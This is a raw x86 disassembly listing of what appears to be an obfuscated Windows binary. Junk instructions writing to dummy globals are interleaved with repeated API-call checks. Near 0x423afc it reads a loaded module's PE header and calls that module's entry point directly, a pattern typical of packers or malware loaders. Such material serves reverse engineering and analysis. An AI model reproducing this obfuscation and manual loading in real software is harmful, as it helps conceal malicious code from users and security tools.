  422f9c:	add    DWORD PTR ds:0x42b1f2,0x42b22a
  422fa6:	add    eax,ebx
  422fa8:	or     DWORD PTR ds:0x42b1c6,0x2272
  422fb2:	mov    ds:0x42b042,eax
  422fb7:	mov    eax,DWORD PTR [esp+0x18]
  422fbb:	xor    eax,edi
  422fbd:	adc    DWORD PTR ds:0x42b192,0x42b18e
  422fc7:	add    eax,ebx
  422fc9:	sbb    DWORD PTR ds:0x42b212,0x42b1b6
  422fd3:	mov    ds:0x42a56a,eax
  422fd8:	sub    DWORD PTR ds:0x42b1a6,edi
  422fde:	mov    eax,ds:0x42a472
  422fe3:	adc    DWORD PTR ds:0x42b1b2,0x42b206
  422fed:	mov    eax,DWORD PTR [eax+0x18c]
  422ff3:	adc    DWORD PTR ds:0x42b1ee,0x42b1da
  422ffd:	mov    eax,DWORD PTR [eax]
  422fff:	or     DWORD PTR ds:0x42b20e,0x42b1c6
  423009:	mov    DWORD PTR [esp+0x60],eax
  42300d:	not    eax
  42300f:	mov    eax,0xf89c85a1
  423014:	sbb    DWORD PTR ds:0x42b1d2,0xc9c
  42301e:	mov    DWORD PTR [esp+0x10],eax
  423022:	mov    DWORD PTR [esp+0x10],eax
  423026:	sbb    DWORD PTR ds:0x42b222,0x42b21e
  423030:	mov    DWORD PTR [esp+0x10],eax
  423034:	mov    DWORD PTR [esp+0x10],ecx
  423038:	sub    DWORD PTR ds:0x42b22a,0x42b1ce
  423042:	mov    DWORD PTR [esp+0x20],eax
  423046:	mov    DWORD PTR [esp+0x20],0xf89c85bd
  42304e:	and    DWORD PTR ds:0x42b1aa,0x45c4
  423058:	mov    eax,DWORD PTR [esp+0x18]
  42305c:	add    DWORD PTR ds:0x42b1c2,0x42b18a
  423066:	xor    eax,edi
  423068:	add    eax,ebx
  42306a:	jmp    0x4231b3
  42306f:	or     DWORD PTR ds:0x42b21a,0x42b18e
  423079:	lea    eax,[esp+0x1b8]
  423080:	push   eax
  423081:	push   0x42a646
  423086:	call   DWORD PTR ds:0x42b312
  42308c:	mov    DWORD PTR ds:0x42b1e2,0x6a7b
  423096:	cmp    eax,0xffffffff
  423099:	mov    DWORD PTR ds:0x42b1be,0xa85
  4230a3:	jne    0x422c5a
  4230a9:	xor    DWORD PTR ds:0x42b1ee,0x42b19a
  4230b3:	push   0xf
  4230b5:	sub    DWORD PTR ds:0x42b1c6,0x42b1a6
  4230bf:	lea    eax,[esp+0x44]
  4230c3:	push   eax
  4230c4:	push   0x42a67a
  4230c9:	push   0x42a68e
  4230ce:	add    DWORD PTR ds:0x42b1ce,0x42b22a
  4230d8:	push   0x42a6b2
  4230dd:	dec    DWORD PTR ds:0x42b1f2
  4230e3:	call   esi
  4230e5:	imul   eax,eax,0x300000
  4230eb:	cmp    eax,0x1b00000
  4230f0:	jne    0x422c5a
  4230f6:	sbb    DWORD PTR ds:0x42b1be,0x817
  423100:	lea    eax,[esp+0x78]
  423104:	push   eax
  423105:	or     DWORD PTR ds:0x42b18e,0x42b1e2
  42310f:	push   0xffffffff
  423111:	add    DWORD PTR ds:0x42b1d6,0x42b18a
  42311b:	call   DWORD PTR ds:0x42b30a
  423121:	xor    DWORD PTR ds:0x42b1fe,0x42b19e
  42312b:	test   eax,eax
  42312d:	mov    DWORD PTR ds:0x42b20e,0x786b
  423137:	jne    0x422c5a
  42313d:	mov    eax,DWORD PTR [esp+0xc]
  423141:	mov    ecx,DWORD PTR [esp+0x20]
  423145:	or     DWORD PTR ds:0x42b1fa,0x5b03
  42314f:	xor    eax,edi
  423151:	and    DWORD PTR ds:0x42b182,0x42b1da
  42315b:	lea    eax,[eax+ecx*1+0x3272f5]
  423162:	push   eax
  423163:	sub    DWORD PTR ds:0x42b1fe,ecx
  423169:	mov    eax,DWORD PTR [esp+0x14]
  42316d:	xor    eax,edi
  42316f:	lea    eax,[ebp+eax*1+0x3272fd]
  423176:	add    DWORD PTR ds:0x42b212,0x505
  423180:	push   eax
  423181:	adc    eax,0xe25
  423186:	mov    eax,ds:0x42a472
  42318b:	push   DWORD PTR [eax+0x1bc]
  423191:	and    DWORD PTR ds:0x42b186,0x42b1b6
  42319b:	call   0x423df0
  4231a0:	mov    eax,DWORD PTR [esp+0xc]
  4231a4:	neg    edx
  4231a6:	mov    ecx,DWORD PTR [esp+0x20]
  4231aa:	xor    eax,edi
  4231ac:	lea    eax,[ecx+eax*1+0x3272f5]
  4231b3:	adc    ecx,DWORD PTR ds:0x42b1fa
  4231b9:	mov    ecx,DWORD PTR [esp+0xc]
  4231bd:	add    DWORD PTR ds:0x42b1ce,edi
  4231c3:	mov    edx,DWORD PTR [esp+0xc]
  4231c7:	and    DWORD PTR ds:0x42b1aa,0x42b186
  4231d1:	xor    edx,edi
  4231d3:	xor    ecx,edi
  4231d5:	not    DWORD PTR ds:0x42b1e6
  4231db:	add    ecx,edx
  4231dd:	mov    edx,DWORD PTR ds:0x42b20a
  4231e3:	and    DWORD PTR ds:0x42b222,edx
  4231e9:	mov    edx,DWORD PTR [esp+0xc]
  4231ed:	xor    edx,edi
  4231ef:	mov    DWORD PTR ds:0x42b182,0x14ab
  4231f9:	lea    ecx,[ecx+edx*1+0x9758df]
  423200:	mov    DWORD PTR ds:0x42b1e2,0x2305
  42320a:	mov    DWORD PTR [esp+0x20],eax
  42320e:	cmp    eax,ecx
  423210:	jbe    0x42306f
  423216:	xor    eax,ecx
  423218:	mov    eax,DWORD PTR [ebp+0xc]
  42321b:	adc    DWORD PTR ds:0x42b186,edi
  423221:	mov    ds:0x42a2f6,eax
  423226:	mov    ecx,DWORD PTR ds:0x42b1fe
  42322c:	adc    DWORD PTR ds:0x42b1f2,ecx
  423232:	mov    eax,DWORD PTR [ebp+0x10]
  423235:	inc    ecx
  423236:	mov    ds:0x42a552,eax
  42323b:	mov    eax,ds:0x42a2f6
  423240:	and    DWORD PTR ds:0x42b1b6,ebx
  423246:	mov    ecx,DWORD PTR [esp+0x30]
  42324a:	sub    eax,ebx
  42324c:	sbb    DWORD PTR ds:0x42b1be,0x1289
  423256:	xor    eax,edi
  423258:	xor    DWORD PTR ds:0x42b216,0x69d8
  423262:	mov    DWORD PTR [ecx],eax
  423264:	sub    DWORD PTR ds:0x42b1fe,0x6484
  42326e:	lea    eax,[esp+0x2c]
  423272:	mov    DWORD PTR [esp+0x6c],eax
  423276:	lea    eax,[ebp+0x4]
  423279:	sbb    DWORD PTR ds:0x42b1ba,0x4eab
  423283:	mov    DWORD PTR [esp+0x2c],eax
  423287:	lea    eax,[esp+0x1b8]
  42328e:	push   eax
  42328f:	xor    DWORD PTR ds:0x42b1b2,0x3d91
  423299:	push   0x42a6e2
  42329e:	mov    DWORD PTR ds:0x42b20e,0x4af0
  4232a8:	call   DWORD PTR ds:0x42b312
  4232ae:	cmp    eax,0xffffffff
  4232b1:	jne    0x422c5a
  4232b7:	push   0xf
  4232b9:	lea    eax,[esp+0x44]
  4232bd:	sub    DWORD PTR ds:0x42b20e,0x42b18a
  4232c7:	push   eax
  4232c8:	or     DWORD PTR ds:0x42b1ba,0x144a
  4232d2:	push   0x42a716
  4232d7:	push   0x42a72a
  4232dc:	sbb    DWORD PTR ds:0x42b1ba,0x42b182
  4232e6:	push   0x42a74e
  4232eb:	xor    DWORD PTR ds:0x42b19e,0x42b1fe
  4232f5:	call   esi
  4232f7:	imul   eax,eax,0x300000
  4232fd:	mov    DWORD PTR ds:0x42b1fa,0x26c3
  423307:	cmp    eax,0x1b00000
  42330c:	mov    DWORD PTR ds:0x42b19a,0x6081
  423316:	jne    0x422c5a
  42331c:	lea    eax,[esp+0x78]
  423320:	push   eax
  423321:	push   0xffffffff
  423323:	and    DWORD PTR ds:0x42b1e6,0x42b1aa
  42332d:	call   DWORD PTR ds:0x42b30a
  423333:	sbb    DWORD PTR ds:0x42b19a,0x42b1f6
  42333d:	test   eax,eax
  42333f:	mov    DWORD PTR ds:0x42b1a2,0x6ec1
  423349:	jne    0x422c5a
  42334f:	sub    DWORD PTR ds:0x42b1b2,0x1fda
  423359:	lea    eax,[esp+0x1b8]
  423360:	sbb    DWORD PTR ds:0x42b1fe,0x42b1ee
  42336a:	push   eax
  42336b:	push   0x42a77e
  423370:	adc    DWORD PTR ds:0x42b1f2,0x42b1c6
  42337a:	call   DWORD PTR ds:0x42b312
  423380:	mov    DWORD PTR ds:0x42b19e,0x2ae7
  42338a:	cmp    eax,0xffffffff
  42338d:	jne    0x422c5a
  423393:	adc    DWORD PTR ds:0x42b206,0x701e
  42339d:	push   0xf
  42339f:	lea    eax,[esp+0x44]
  4233a3:	or     DWORD PTR ds:0x42b18e,0x5b00
  4233ad:	push   eax
  4233ae:	push   0x42a7b2
  4233b3:	dec    DWORD PTR ds:0x42b1ba
  4233b9:	push   0x42a7c6
  4233be:	push   0x42a7ea
  4233c3:	sub    DWORD PTR ds:0x42b1e6,0x42b20e
  4233cd:	call   esi
  4233cf:	imul   eax,eax,0x300000
  4233d5:	mov    DWORD PTR ds:0x42b1be,0x6087
  4233df:	cmp    eax,0x1b00000
  4233e4:	mov    DWORD PTR ds:0x42b1d6,0x2e79
  4233ee:	jne    0x422c5a
  4233f4:	lea    eax,[esp+0x78]
  4233f8:	and    DWORD PTR ds:0x42b21e,0x6601
  423402:	push   eax
  423403:	add    DWORD PTR ds:0x42b206,0x4958
  42340d:	push   0xffffffff
  42340f:	and    DWORD PTR ds:0x42b1fa,0x42b1aa
  423419:	call   DWORD PTR ds:0x42b30a
  42341f:	mov    DWORD PTR ds:0x42b222,0x2f7c
  423429:	test   eax,eax
  42342b:	jne    0x422c5a
  423431:	and    DWORD PTR ds:0x42b1e2,0x6b99
  42343b:	lea    eax,[esp+0x1b8]
  423442:	push   eax
  423443:	add    DWORD PTR ds:0x42b22a,0x61ec
  42344d:	push   0x42a81a
  423452:	call   DWORD PTR ds:0x42b312
  423458:	mov    DWORD PTR ds:0x42b1c6,0x2abd
  423462:	cmp    eax,0xffffffff
  423465:	jne    0x422c5a
  42346b:	sbb    DWORD PTR ds:0x42b202,0x42b212
  423475:	push   0xf
  423477:	sub    DWORD PTR ds:0x42b192,0x503c
  423481:	lea    eax,[esp+0x44]
  423485:	push   eax
  423486:	push   0x42a84e
  42348b:	push   0x42a862
  423490:	push   0x42a886
  423495:	call   esi
  423497:	and    DWORD PTR ds:0x42b1c6,0x7bbe
  4234a1:	imul   eax,eax,0x300000
  4234a7:	cmp    eax,0x1b00000
  4234ac:	mov    DWORD PTR ds:0x42b1fe,0x19ae
  4234b6:	jne    0x422c5a
  4234bc:	lea    eax,[esp+0x78]
  4234c0:	push   eax
  4234c1:	neg    DWORD PTR ds:0x42b19e
  4234c7:	push   0xffffffff
  4234c9:	call   DWORD PTR ds:0x42b30a
  4234cf:	sbb    DWORD PTR ds:0x42b1aa,0x42b21e
  4234d9:	test   eax,eax
  4234db:	mov    DWORD PTR ds:0x42b196,0x192f
  4234e5:	jne    0x422c5a
  4234eb:	or     DWORD PTR ds:0x42b186,0x42b22e
  4234f5:	lea    eax,[esp+0x1b8]
  4234fc:	push   eax
  4234fd:	push   0x42a8b6
  423502:	sbb    DWORD PTR ds:0x42b216,0x426f
  42350c:	call   DWORD PTR ds:0x42b312
  423512:	cmp    eax,0xffffffff
  423515:	mov    DWORD PTR ds:0x42b18e,0x3e1f
  42351f:	jne    0x422c5a
  423525:	push   0xf
  423527:	or     DWORD PTR ds:0x42b182,0x42b1da
  423531:	lea    eax,[esp+0x44]
  423535:	push   eax
  423536:	push   0x42a8ea
  42353b:	xor    DWORD PTR ds:0x42b226,0x42b20a
  423545:	push   0x42a8fe
  42354a:	sub    DWORD PTR ds:0x42b226,0x42b22a
  423554:	push   0x42a922
  423559:	add    DWORD PTR ds:0x42b216,0x42b1d6
  423563:	call   esi
  423565:	add    DWORD PTR ds:0x42b1f6,0x38e
  42356f:	imul   eax,eax,0x300000
  423575:	mov    DWORD PTR ds:0x42b19a,0x2257
  42357f:	cmp    eax,0x1b00000
  423584:	mov    DWORD PTR ds:0x42b21a,0x2a1a
  42358e:	jne    0x422c5a
  423594:	adc    DWORD PTR ds:0x42b206,0x42b1a6
  42359e:	lea    eax,[esp+0x78]
  4235a2:	or     DWORD PTR ds:0x42b22e,0x42b1ca
  4235ac:	push   eax
  4235ad:	push   0xffffffff
  4235af:	call   DWORD PTR ds:0x42b30a
  4235b5:	and    DWORD PTR ds:0x42b182,0x42b1a6
  4235bf:	test   eax,eax
  4235c1:	mov    DWORD PTR ds:0x42b1aa,0x4002
  4235cb:	jne    0x422c5a
  4235d1:	dec    DWORD PTR ds:0x42b212
  4235d7:	lea    eax,[esp+0x1b8]
  4235de:	dec    DWORD PTR ds:0x42b18e
  4235e4:	push   eax
  4235e5:	or     DWORD PTR ds:0x42b1ea,0x42b212
  4235ef:	push   0x42a952
  4235f4:	add    DWORD PTR ds:0x42b202,0x42b216
  4235fe:	call   DWORD PTR ds:0x42b312
  423604:	cmp    eax,0xffffffff
  423607:	mov    DWORD PTR ds:0x42b212,0x6bd3
  423611:	jne    0x422c5a
  423617:	push   0xf
  423619:	add    DWORD PTR ds:0x42b1da,0x37be
  423623:	lea    eax,[esp+0x44]
  423627:	xor    DWORD PTR ds:0x42b216,0x42b21e
  423631:	push   eax
  423632:	push   0x42a986
  423637:	sub    DWORD PTR ds:0x42b1be,0x5164
  423641:	push   0x42a99a
  423646:	push   0x42a9be
  42364b:	or     DWORD PTR ds:0x42b182,0x42b21e
  423655:	call   esi
  423657:	and    DWORD PTR ds:0x42b20e,0x1f3e
  423661:	imul   eax,eax,0x300000
  423667:	mov    DWORD PTR ds:0x42b1ee,0x7e45
  423671:	cmp    eax,0x1b00000
  423676:	jne    0x422c5a
  42367c:	add    DWORD PTR ds:0x42b182,0x42b1b2
  423686:	lea    eax,[esp+0x78]
  42368a:	sub    DWORD PTR ds:0x42b1c6,0x42b1a6
  423694:	push   eax
  423695:	sbb    DWORD PTR ds:0x42b1b2,0x42b18a
  42369f:	push   0xffffffff
  4236a1:	adc    DWORD PTR ds:0x42b212,0x32d0
  4236ab:	call   DWORD PTR ds:0x42b30a
  4236b1:	or     DWORD PTR ds:0x42b1f2,0x42b1fe
  4236bb:	test   eax,eax
  4236bd:	jne    0x422c5a
  4236c3:	and    DWORD PTR ds:0x42b186,0x42b1fa
  4236cd:	lea    eax,[esp+0x1b8]
  4236d4:	xor    DWORD PTR ds:0x42b202,0x42b1fa
  4236de:	push   eax
  4236df:	push   0x42a9ee
  4236e4:	call   DWORD PTR ds:0x42b312
  4236ea:	mov    DWORD PTR ds:0x42b1ea,0x2426
  4236f4:	cmp    eax,0xffffffff
  4236f7:	mov    DWORD PTR ds:0x42b20a,0x3daf
  423701:	jne    0x422c5a
  423707:	sub    DWORD PTR ds:0x42b1e6,0x42b22a
  423711:	push   0xf
  423713:	adc    DWORD PTR ds:0x42b1ee,0x42b20a
  42371d:	lea    eax,[esp+0x44]
  423721:	and    DWORD PTR ds:0x42b20a,0x3b25
  42372b:	push   eax
  42372c:	push   0x42aa22
  423731:	sub    DWORD PTR ds:0x42b1fe,0x42b21e
  42373b:	push   0x42aa36
  423740:	mov    DWORD PTR ds:0x42b1fa,0x4cb4
  42374a:	push   0x42aa5a
  42374f:	call   esi
  423751:	inc    DWORD PTR ds:0x42b1a2
  423757:	imul   eax,eax,0x300000
  42375d:	cmp    eax,0x1b00000
  423762:	mov    DWORD PTR ds:0x42b1ea,0x7ee6
  42376c:	jne    0x422c5a
  423772:	or     DWORD PTR ds:0x42b1ea,0x7d0f
  42377c:	lea    eax,[esp+0x78]
  423780:	mov    DWORD PTR ds:0x42b1aa,0x7d0c
  42378a:	push   eax
  42378b:	adc    DWORD PTR ds:0x42b1aa,0x4970
  423795:	push   0xffffffff
  423797:	and    DWORD PTR ds:0x42b212,0x37c9
  4237a1:	call   DWORD PTR ds:0x42b30a
  4237a7:	sbb    DWORD PTR ds:0x42b21e,0x7cde
  4237b1:	test   eax,eax
  4237b3:	mov    DWORD PTR ds:0x42b206,0x64c2
  4237bd:	jne    0x422c5a
  4237c3:	sub    DWORD PTR ds:0x42b1c6,0x42b182
  4237cd:	lea    eax,[esp+0x1b8]
  4237d4:	add    DWORD PTR ds:0x42b19e,0x42b1ee
  4237de:	push   eax
  4237df:	and    DWORD PTR ds:0x42b212,0x42b1de
  4237e9:	push   0x42aa8a
  4237ee:	sbb    DWORD PTR ds:0x42b20e,0x42b1fe
  4237f8:	call   DWORD PTR ds:0x42b312
  4237fe:	mov    DWORD PTR ds:0x42b222,0x5e52
  423808:	cmp    eax,0xffffffff
  42380b:	mov    DWORD PTR ds:0x42b19a,0x4e9b
  423815:	jne    0x422c5a
  42381b:	or     DWORD PTR ds:0x42b1a6,0x4b96
  423825:	push   0xf
  423827:	lea    eax,[esp+0x44]
  42382b:	or     DWORD PTR ds:0x42b22e,0x42b192
  423835:	push   eax
  423836:	push   0x42aabe
  42383b:	push   0x42aad2
  423840:	push   0x42aaf6
  423845:	add    DWORD PTR ds:0x42b216,0x42b1ee
  42384f:	call   esi
  423851:	xor    DWORD PTR ds:0x42b1e2,0x982
  42385b:	imul   eax,eax,0x300000
  423861:	mov    DWORD PTR ds:0x42b1aa,0x5061
  42386b:	cmp    eax,0x1b00000
  423870:	jne    0x422c5a
  423876:	lea    eax,[esp+0x78]
  42387a:	xor    DWORD PTR ds:0x42b1fa,0x42b1ee
  423884:	push   eax
  423885:	push   0xffffffff
  423887:	call   DWORD PTR ds:0x42b30a
  42388d:	test   eax,eax
  42388f:	jne    0x422c5a
  423895:	add    DWORD PTR ds:0x42b21e,0x42b1ce
  42389f:	lea    eax,[esp+0x1b8]
  4238a6:	push   eax
  4238a7:	adc    DWORD PTR ds:0x42b1fe,0x6ad9
  4238b1:	push   0x42ab26
  4238b6:	or     DWORD PTR ds:0x42b1d6,0x42b1be
  4238c0:	call   DWORD PTR ds:0x42b312
  4238c6:	mov    DWORD PTR ds:0x42b216,0x33dc
  4238d0:	cmp    eax,0xffffffff
  4238d3:	mov    DWORD PTR ds:0x42b182,0x32d8
  4238dd:	jne    0x422c5a
  4238e3:	add    DWORD PTR ds:0x42b1b6,0x3dc0
  4238ed:	push   0xf
  4238ef:	lea    eax,[esp+0x44]
  4238f3:	xor    DWORD PTR ds:0x42b19a,0x42b1ce
  4238fd:	push   eax
  4238fe:	push   0x42ab5a
  423903:	add    DWORD PTR ds:0x42b1e6,0x62a8
  42390d:	push   0x42ab6e
  423912:	push   0x42ab92
  423917:	xor    DWORD PTR ds:0x42b19e,0x23c8
  423921:	call   esi
  423923:	xor    DWORD PTR ds:0x42b226,0x14f0
  42392d:	imul   eax,eax,0x300000
  423933:	mov    DWORD PTR ds:0x42b1ea,0x193b
  42393d:	cmp    eax,0x1b00000
  423942:	mov    DWORD PTR ds:0x42b1ee,0x7050
  42394c:	jne    0x422c5a
  423952:	or     DWORD PTR ds:0x42b1ce,0x3f0
  42395c:	lea    eax,[esp+0x78]
  423960:	push   eax
  423961:	push   0xffffffff
  423963:	call   DWORD PTR ds:0x42b30a
  423969:	test   eax,eax
  42396b:	jne    0x422c5a
  423971:	lea    eax,[esp+0x1b8]
  423978:	push   eax
  423979:	push   0x42abc2
  42397e:	call   DWORD PTR ds:0x42b312
  423984:	cmp    eax,0xffffffff
  423987:	jne    0x422c5a
  42398d:	push   0xf
  42398f:	lea    eax,[esp+0x44]
  423993:	push   eax
  423994:	push   0x42abf6
  423999:	push   0x42ac0a
  42399e:	push   0x42ac2e
  4239a3:	call   esi
  4239a5:	imul   eax,eax,0x300000
  4239ab:	cmp    eax,0x1b00000
  4239b0:	jne    0x422c5a
  4239b6:	lea    eax,[esp+0x78]
  4239ba:	push   eax
  4239bb:	push   0xffffffff
  4239bd:	call   DWORD PTR ds:0x42b30a
  4239c3:	test   eax,eax
  4239c5:	jne    0x422c5a
  4239cb:	lea    eax,[esp+0x1b8]
  4239d2:	push   eax
  4239d3:	push   0x42ac5e
  4239d8:	call   DWORD PTR ds:0x42b312
  4239de:	cmp    eax,0xffffffff
  4239e1:	jne    0x422c5a
  4239e7:	push   0xf
  4239e9:	lea    eax,[esp+0x44]
  4239ed:	push   eax
  4239ee:	push   0x42ac92
  4239f3:	push   0x42aca6
  4239f8:	push   0x42acca
  4239fd:	call   esi
  4239ff:	imul   eax,eax,0x300000
  423a05:	cmp    eax,0x1b00000
  423a0a:	jne    0x422c5a
  423a10:	lea    eax,[esp+0x78]
  423a14:	push   eax
  423a15:	push   0xffffffff
  423a17:	call   DWORD PTR ds:0x42b30a
  423a1d:	test   eax,eax
  423a1f:	jne    0x422c5a
  423a25:	lea    eax,[esp+0x1b8]
  423a2c:	push   eax
  423a2d:	push   0x42acfa
  423a32:	call   DWORD PTR ds:0x42b312
  423a38:	cmp    eax,0xffffffff
  423a3b:	jne    0x422c5a
  423a41:	push   0xf
  423a43:	lea    eax,[esp+0x44]
  423a47:	push   eax
  423a48:	push   0x42ad2e
  423a4d:	push   0x42ad42
  423a52:	push   0x42ad66
  423a57:	call   esi
  423a59:	imul   eax,eax,0x300000
  423a5f:	cmp    eax,0x1b00000
  423a64:	jne    0x422c5a
  423a6a:	lea    eax,[esp+0x78]
  423a6e:	push   eax
  423a6f:	push   0xffffffff
  423a71:	call   DWORD PTR ds:0x42b30a
  423a77:	test   eax,eax
  423a79:	jne    0x422c5a
  423a7f:	lea    eax,[esp+0x1b8]
  423a86:	push   eax
  423a87:	push   0x42ad96
  423a8c:	call   DWORD PTR ds:0x42b312
  423a92:	cmp    eax,0xffffffff
  423a95:	jne    0x422c5a
  423a9b:	push   0xf
  423a9d:	lea    eax,[esp+0x44]
  423aa1:	push   eax
  423aa2:	push   0x42adca
  423aa7:	push   0x42adde
  423aac:	push   0x42ae02
  423ab1:	call   esi
  423ab3:	imul   eax,eax,0x300000
  423ab9:	cmp    eax,0x1b00000
  423abe:	jne    0x422c5a
  423ac4:	lea    eax,[esp+0x78]
  423ac8:	push   eax
  423ac9:	push   0xffffffff
  423acb:	call   DWORD PTR ds:0x42b30a
  423ad1:	test   eax,eax
  423ad3:	jne    0x422c5a
  423ad9:	mov    eax,DWORD PTR [esp+0x3c]
  423add:	cmp    eax,0xf89c85a2
  423ae2:	je     0x423b41
  423ae8:	mov    eax,DWORD PTR [esp+0x18]
  423aec:	mov    ecx,DWORD PTR [esp+0x38]
  423af0:	xor    eax,edi
  423af2:	add    eax,ebx
  423af4:	cmp    eax,ecx
  423af6:	je     0x423b41
  423afc:	mov    eax,ds:0x42a472
  423b01:	mov    eax,DWORD PTR [eax+0x194]
  423b07:	mov    ecx,DWORD PTR [eax]
  423b09:	mov    eax,DWORD PTR [ecx+0x3c]
  423b0c:	push   DWORD PTR ds:0x42a552
  423b12:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  423b16:	push   DWORD PTR ds:0x42a2f6
  423b1c:	add    eax,ecx
  423b1e:	mov    ecx,DWORD PTR ds:0x42a472
  423b24:	mov    ecx,DWORD PTR [ecx+0x194]
  423b2a:	push   DWORD PTR [ecx]
  423b2c:	call   eax
  423b2e:	mov    ecx,DWORD PTR ds:0x42a472
  423b34:	mov    ecx,DWORD PTR [ecx+0x1cc]
  423b3a:	mov    DWORD PTR [ecx],eax
  423b3c:	jmp    0x423d6c
  423b41:	mov    eax,DWORD PTR [esp+0x18]
  423b45:	mov    ecx,DWORD PTR [esp+0x60]
  423b49:	xor    eax,edi
  423b4b:	add    eax,ebx
  423b4d:	cmp    eax,ecx
  423b4f:	jne    0x423bba
  423b55:	mov    eax,DWORD PTR [esp+0x18]
  423b59:	mov    ecx,DWORD PTR ds:0x42a472
  423b5f:	mov    ecx,DWORD PTR [ecx+0x198]
  423b65:	xor    eax,edi
  423b67:	add    eax,ebx
  423b69:	cmp    eax,DWORD PTR [ecx]
  423b6b:	jne    0x423b93
  423b71:	mov    eax,DWORD PTR [esp+0x18]
  423b75:	push   0xffffffff
  423b77:	push   0x70941f95
  423b7c:	xor    eax,edi
  423b7e:	add    eax,ebx
  423b80:	push   eax
  423b81:	push   0xf89c85a1
  423b86:	push   DWORD PTR [esp+0x1c]
  423b8a:	push   DWORD PTR [esp+0x2c]
  423b8e:	call   0x4224d2
  423b93:	push   DWORD PTR [esp+0xc]
  423b97:	push   DWORD PTR [esp+0x1c]
  423b9b:	call   0x401000
  423ba0:	mov    eax,DWORD PTR [esp+0x18]
  423ba4:	xor    eax,edi
  423ba6:	add    eax,ebx
  423ba8:	mov    ds:0x42a4fe,eax
  423bad:	mov    eax,DWORD PTR [esp+0x18]
  423bb1:	xor    eax,edi
  423bb3:	add    eax,ebx
  423bb5:	mov    ds:0x42a4f6,eax
  423bba:	mov    eax,DWORD PTR [esp+0x2c]
  423bbe:	test   eax,eax
  423bc0:	je     0x423d6c
  423bc6:	lea    eax,[esp+0x1b8]
  423bcd:	mov    DWORD PTR [esp+0x64],0xf152c3a
  423bd5:	push   eax
  423bd6:	mov    DWORD PTR [esp+0x78],0x712ed2f
  423bde:	mov    DWORD PTR [esp+0x74],0x373fc0d
  423be6:	push   0x42ae32
  423beb:	mov    DWORD PTR [esp+0x70],0x72670add
  423bf3:	call   DWORD PTR ds:0x42b312
  423bf9:	cmp    eax,0xffffffff
  423bfc:	jne    0x422c5a
  423c02:	push   0xf
  423c04:	lea    eax,[esp+0x44]
  423c08:	push   eax
  423c09:	push   0x42ae66
  423c0e:	push   0x42ae7a
  423c13:	push   0x42ae9e
  423c18:	call   esi
  423c1a:	imul   eax,eax,0x300000
  423c20:	cmp    eax,0x1b00000
  423c25:	jne    0x422c5a
  423c2b:	lea    eax,[esp+0x78]
  423c2f:	push   eax
  423c30:	push   0xffffffff
  423c32:	call   DWORD PTR ds:0x42b30a
  423c38:	test   eax,eax
  423c3a:	jne    0x422c5a
  423c40:	call   0x41b628
  423c45:	mov    eax,DWORD PTR [esp+0x34]
  423c49:	mov    eax,DWORD PTR [esp+0xc]
  423c4d:	mov    DWORD PTR [esp+0x30],eax
  423c51:	mov    eax,DWORD PTR [esp+0x18]
  423c55:	mov    DWORD PTR [esp+0xc],eax
  423c59:	mov    eax,eax
  423c5b:	mov    eax,ds:0x42a472
  423c60:	mov    ecx,DWORD PTR [eax+0x1c0]
  423c66:	mov    edx,DWORD PTR [ecx]
  423c68:	and    DWORD PTR [esp+0x14],0x0
  423c6d:	mov    esi,0xfabdbed4
  423c72:	add    edx,esi
  423c74:	adc    DWORD PTR [esp+0x14],0xffffffff
  423c79:	mov    ecx,0x8a29a141
  423c7e:	xor    edx,ecx
  423c80:	mov    DWORD PTR [esp+0x20],edx
  423c84:	mov    edx,DWORD PTR [esp+0x14]
  423c88:	xor    edx,0x0
  423c8b:	cmp    DWORD PTR [esp+0x20],0x70941f94
  423c93:	mov    DWORD PTR [esp+0x24],edx
  423c97:	jne    0x423ca6
  423c9d:	cmp    edx,0xffffffff
  423ca0:	je     0x423d0f
  423ca6:	mov    eax,DWORD PTR [eax+0x1c8]
  423cac:	mov    eax,DWORD PTR [eax]
  423cae:	cdq    
  423caf:	add    eax,esi
  423cb1:	adc    edx,0xffffffff
  423cb4:	and    DWORD PTR [esp+0x14],0x0
  423cb9:	xor    edx,0x0
  423cbc:	mov    DWORD PTR [esp+0x1c],edx
  423cc0:	mov    edx,DWORD PTR [esp+0xc]
  423cc4:	mov    DWORD PTR [esp+0x10],edx
  423cc8:	xor    eax,ecx
  423cca:	add    DWORD PTR [esp+0x10],esi
  423cce:	mov    edx,DWORD PTR [esp+0x10]
  423cd2:	adc    DWORD PTR [esp+0x14],0xffffffff
  423cd7:	xor    edx,ecx
  423cd9:	mov    DWORD PTR [esp+0x20],edx
  423cdd:	mov    edx,DWORD PTR [esp+0x14]
  423ce1:	xor    edx,0x0
  423ce4:	mov    DWORD PTR [esp+0x24],edx
  423ce8:	cmp    DWORD PTR [esp+0x20],eax
  423cec:	jne    0x423cfe
  423cf2:	mov    eax,DWORD PTR [esp+0x1c]
  423cf6:	cmp    edx,eax
  423cf8:	je     0x423d0f
  423cfe:	mov    eax,DWORD PTR [esp+0xc]
  423d02:	add    eax,DWORD PTR [esp+0x30]
  423d06:	mov    DWORD PTR [esp+0xc],eax
  423d0a:	jmp    0x423d6c
  423d0f:	mov    eax,ds:0x42a4f6
  423d14:	mov    edx,DWORD PTR ds:0x42a4fe
  423d1a:	xor    eax,edx
  423d1c:	mov    ds:0x42a4f6,eax
  423d21:	mov    edx,DWORD PTR ds:0x42a4f6
  423d27:	mov    eax,DWORD PTR [esp+0x2c]
  423d2b:	add    DWORD PTR [eax],edx
  423d2d:	mov    edx,DWORD PTR [esp+0xc]
  423d31:	mov    eax,ds:0x42a4f6
  423d36:	xor    edx,edi
  423d38:	add    edx,ebx
  423d3a:	xor    ebx,ebx
  423d3c:	add    edx,esi
  423d3e:	adc    ebx,0xffffffff
  423d41:	xor    edi,edi
  423d43:	xor    edx,ecx
  423d45:	xor    ebx,0x0
  423d48:	add    eax,esi
  423d4a:	adc    edi,0xffffffff
  423d4d:	xor    eax,ecx
  423d4f:	xor    edi,0x0
  423d52:	cmp    eax,edx
  423d54:	jne    0x423d6c
  423d5a:	cmp    edi,ebx
  423d5c:	jne    0x423d6c
  423d62:	mov    eax,ds:0x42a4f6
  423d67:	mov    ds:0x42a4fe,eax
  423d6c:	lea    eax,[esp+0x1b8]
  423d73:	push   eax
  423d74:	push   0x42aece
  423d79:	call   DWORD PTR ds:0x42b312
  423d7f:	cmp    eax,0xffffffff
  423d82:	jne    0x422c5a
  423d88:	push   0xf
  423d8a:	lea    eax,[esp+0x44]
  423d8e:	push   eax
  423d8f:	push   0x42af02
  423d94:	push   0x42af16
  423d99:	push   0x42af3a
  423d9e:	call   DWORD PTR ds:0x42b302
